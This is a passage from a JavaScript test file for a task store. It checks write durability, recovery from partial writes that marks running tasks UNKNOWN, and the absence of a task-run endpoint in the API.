      assert.throws(() => new TaskStore({ dir, fsImpl: partialThenFail(failure) }), /write/i);
      assert.deepEqual(readFileSync(file), before);
      assert.deepEqual(live.get(original.taskId), original);
      assert.deepEqual(readdirSync(dir), [`${original.taskId}.json`]);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('durability: successful partial-write recovery persists UNKNOWN before reporting recovery', () => {
  const dir = tmp();
  try {
    const original = { ...draft(), status: 'RUNNING' };
    new TaskStore({ dir }).create(original);
    const recovered = new TaskStore({ dir, fsImpl: limitedWrites(16), now: () => '2026-01-03T00:00:00.000Z' });
    assert.deepEqual(recovered.recoveredTaskIds, [original.taskId]);
    assert.deepEqual(recovered.get(original.taskId), { ...original, status: 'UNKNOWN', updatedAt: '2026-01-03T00:00:00.000Z' });
    assert.deepEqual(readdirSync(dir), [`${original.taskId}.json`]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});


test('api: no browser execution endpoint; run POST remains 404 and task stays DRAFT',async()=>{
  await withApp(undefined,async({base,store,dir})=>{
    const response=await post(base,validBody());const {task}=await response.json();
    assert.equal((await post(`${base}/${task.taskId}/run`,{})).status,404);
    assert.equal(store.get(task.taskId).status,'DRAFT');
    assert.deepEqual(readdirSync(dir),[`${task.taskId}.json`]);
  });
});
